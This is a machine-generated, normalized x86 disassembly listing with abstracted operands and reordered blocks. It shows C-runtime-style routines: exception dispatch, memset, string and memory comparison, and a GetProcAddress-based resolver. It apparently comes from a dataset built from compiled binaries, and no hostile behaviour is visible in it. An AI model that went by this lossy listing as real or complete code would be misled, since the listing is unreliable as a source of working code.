je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_42707e
pop ecx
pop ecx
push eax
push edi
call sub_421ef0
add esp 0xc
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
call sub_429b15
retn
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_42707e
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_4272b6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_42f4f6
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_42f4f6
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_42f4f6
and [ eax + 0x90 ] 0x0
jmp sub_42e188
sub_427304
push 0x10
push r--data
call sub_429ad0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4273c3
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_42f4f6
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_429b15
retn
call sub_42e150
call sub_42e150
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_431060
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4273dd
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_42f4f6
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
xor esi esi
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_426b32
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_427304
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4274bc
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_427990
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_427575
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_427597
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
leave
retn
movzx eax [ ebp - 0x14 ]
leave
retn
sub_4275b8
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
xor eax eax
inc eax
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_4275e6
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_427624
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_4278bb
call sub_42e1ed
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_42e216
pop ecx
push 0x3
call sub_4235d5
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_42a0d6
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_427900
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_427990
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_427a20
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_427af0
push ebp
mov ebp esp
push esi
call sub_427add
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_427b24
pop ecx
mov esi eax
call sub_427b11
mov [ eax ] esi
pop esi
pop ebp
retn
sub_427b24
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_427b7e
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_4247f2
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_427b11
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_432c17
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_431633
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_426663
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_427cbf
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_427b7e
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_427cf0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_427d30
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_427d98
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
dec eax
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
dec eax
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
dec eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_429490 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
